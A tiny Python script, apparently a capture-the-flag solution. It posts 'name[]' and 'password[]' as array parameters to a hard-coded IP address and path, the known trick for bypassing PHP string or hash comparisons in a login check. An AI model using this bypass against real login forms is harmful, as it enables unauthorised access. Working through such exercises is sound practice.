import requests
url = "http://115.28.78.16:13333/web/web3/"
re = requests.post(url,data={"name[]":"1", "password[]":"2"})
print(re.text)
